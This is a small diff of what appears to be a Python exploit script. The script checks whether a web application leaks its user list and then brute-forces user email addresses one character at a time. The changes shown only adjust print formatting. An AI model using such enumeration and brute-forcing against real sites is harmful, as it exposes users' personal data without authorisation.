@@ -22,7 +22,8 @@ def check_vulnerability(url):
 		if "@" not in str(i['id']) + i['name'] + i['slug']:
 			user_count = len(res)
 			print("[i] Target is vulnerable. ")
-			print("[i] Number of users: " + str(user_count) + "\n")
+			print("[i] Number of users: " + str(user_count))
+			print("")
 			return True
 	return False
 
@@ -50,7 +51,7 @@ def brute_email(url, domain):
 	while True:
 		success = False
 		for i in alphabet:
-			#print("Trying:" + i)
+			#print("Trying: " + i)
 			if check(url, i + email_address):
 				success = True
 				email_address = i + email_address
